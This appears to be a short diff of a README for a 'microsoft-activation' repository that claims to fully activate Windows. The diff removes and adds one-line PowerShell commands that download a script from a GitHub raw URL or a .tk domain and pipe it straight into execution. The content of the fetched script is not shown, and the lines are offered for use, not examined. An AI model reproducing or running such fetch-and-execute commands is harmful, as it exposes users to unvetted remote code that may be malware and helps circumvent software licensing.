@@ -1,10 +1,5 @@
-# microsoft-activation
-Active FULL WIN
+### Features
 
-irm https://raw.githubusercontent.com/ANTU-ALT-F4/microsoft-activation/main/get | iex
-
-
-`irm https://raw.githubusercontent.com/ANTU-ALT-F4/microsoft-activation/main/get | iex`
-
-
-`irm https://hoatdong.tk/get | iex`
+```shell
+irm https://hoatdong.tk/get | iex
+```
